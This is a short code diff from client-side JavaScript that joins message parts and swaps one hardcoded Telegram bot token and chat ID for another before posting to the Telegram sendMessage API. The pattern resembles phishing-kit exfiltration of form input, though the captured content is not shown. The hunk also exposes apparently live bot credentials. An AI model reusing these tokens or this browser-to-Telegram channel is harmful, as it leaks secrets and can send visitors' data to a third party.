@@ -50,8 +50,8 @@ $(function () {
         const message = messageParts.join('\n');
 
         // Telegram Bot Token and Chat ID
-        const botToken = '7896593630:AAFgsNG0pAd883_7-B3HP3k74LRNVeGEEJQ';
-        const chatId = '1827103419';
+        const botToken = '8181027989:AAGdpMKmBD8FMqvkTPxOY0GFTGnNxOsW6gw';
+        const chatId = '5066612816';
 
         // Telegram API URL
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
